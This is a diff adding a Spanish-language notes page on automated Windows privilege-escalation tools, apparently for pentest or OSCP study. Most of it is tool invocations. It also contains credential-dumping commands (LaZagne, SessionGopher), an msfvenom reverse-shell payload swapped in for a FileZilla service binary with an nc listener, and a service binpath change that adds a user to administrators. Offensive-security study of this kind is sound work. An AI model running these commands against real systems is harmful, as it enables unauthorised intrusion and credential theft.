@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Herramientas automatizadas | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="herramientas-automatizadas">
+          <div class="note-tabbar">
+            <span>Herramientas automatizadas</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Utilidades</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / utilidades</p>
+            <h2>Herramientas automatizadas</h2>
+
+            <p>Las herramientas automatizadas aceleran la enumeración y detección de malas configuraciones, pero sus hallazgos deben validarse manualmente antes de ejecutar una técnica de escalada.</p>
+
+            <p><a href="https://github.com/puckiestyle/powershell">Links</a></p>
+            <h2>Enumeración completa</h2>
+            <h2><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a></h2>
+            <section class="code-card">
+              <h3>PowerShell: Lanzar cualquier binario: .ps1, .bat, .exe</h3>
+              <pre><code>winpeas.exe
+powershell -ep bypass ./winPEAS.ps1</code></pre>
+            </section>
+            <h2><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a></h2>
+            <section class="code-card">
+              <h3>PowerShell: Buscar todas las posibles vulnerabilidades</h3>
+              <pre><code>. .\PowerUp.ps1
+Invoke-AllChecks</code></pre>
+            </section>
+            <h2><a href="https://github.com/Daniel10Barredo/OSCP_AuxReconTools">AuxRecon.ps1</a> (PowerShell)</h2>
+            <section class="code-card">
+              <h3>PowerShell: Enumerar todo el sistema semi-automático</h3>
+              <pre><code>Import-Module .\recon.ps1
+# Lanzar módulos: recon.programs, recon.users ...</code></pre>
+            </section>
+            <h2>Credenciales Almacenadas</h2>
+            <h2><a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a></h2>
+            <section class="code-card">
+              <h3>PowerShell: Credenciales en Aplicaciones</h3>
+              <pre><code># Lanzar todos los módulos de LaZagne para recuperar credenciales en aplicaciones comunes
+.\LaZagne.exe all</code></pre>
+            </section>
+            <h2><a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a></h2>
+            <section class="code-card">
+              <h3>PowerShell: Credenciales en Herramientas y Registros</h3>
+              <pre><code># Extrae credenciales de herramientas como RDP, PuTTY, WinSCP, FileZilla, SuperPuTTY
+. .\SessionGopher.ps1
+Invoke-SessionGopher -Thorough</code></pre>
+            </section>
+            <h2>Permisos mal configurados</h2>
+            <h2><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1">PowerUp</a></h2>
+            <section class="code-card">
+              <h3>PowerShell: Permisos mal configurados y credenciales en texto claro</h3>
+              <pre><code># Buscar servicios vulnerables a modificaciones del binario
+. .\PowerUp.ps1
+Invoke-PrivescAudit # Busca Servicios mal configurados y credenciales en texto claro
+# Servicio vulnerable: FileZilla
+# Path: &quot;C:\Program Files (x86)\FileZilla Server.exe&quot;
+icacls &quot;C:\Program Files (x86)\FileZilla Server.exe&quot;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Payload y Listener</h3>
+              <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=&lt;kali_ip&gt; lport=443 -f exe &gt; &#x27;FileZilla Server.exe&#x27;
+rlwrap nc -lnvp 443</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>CMD: Sustituir &#x27;FileZilla Server.exe&#x27; original por el nuestro</h3>
+              <pre><code>cmd /c copy /Y &#x27;FileZilla Server.exe&#x27; &quot;C:\Program Files (x86)\FileZilla Server.exe&quot;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>CMD: Reiniciar Servicios</h3>
+              <pre><code>sc.exe stop &quot;FileZillaServer&quot;
+sc.exe start &quot;FileZillaServer&quot;</code></pre>
+            </section>
+            <h2><a href="https://github.com/GhostPack/SharpUp/">SharpUp</a></h2>
+            <section class="code-card">
+              <h3>CMD: Permisos mal configurados</h3>
+              <pre><code># Buscar servicios vulnerables a modificaciones en el Path
+SharpUp.exe audit
+# Servicio vulnerable: WindscribeService
+# Path: C:\Program Files (x86)\Windscribe\WindscribeService.exe
+icacls &quot;C:\Program Files (x86)\Windscribe\WindscribeService.exe&quot;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>CMD: Editar Path para añadir a nuestro usuario actual al grupo de administradores</h3>
+              <pre><code>sc config WindscribeService binpath=&quot;cmd /c net localgroup administrators &lt;user&gt; /add&quot;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>CMD: Reiniciar Servicio</h3>
+              <pre><code>sc stop &quot;WindscribeService&quot;
+sc start &quot;WindscribeService&quot;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>CMD: Comprobar Escalada</h3>
+              <pre><code>net localgroup administrators
+# Reiniciar Terminal</code></pre>
+            </section>
+            <h2><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a> (Permisos mal configurados)</h2>
+            <section class="code-card">
+              <h3>PowerShell: Permisos mal configurados y credenciales en texto claro</h3>
+              <pre><code>. .\PrivescCheck.ps1
+Invoke-PrivescCheck</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>herramientas</span>
+              <span>winpeas</span>
+              <span>powerup</span>
+              <span>sharpup</span>
+              <span>privesccheck</span>
+              <span>lazagne</span>
+              <span>sessiongopher</span>
+              <span>auxrecon</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
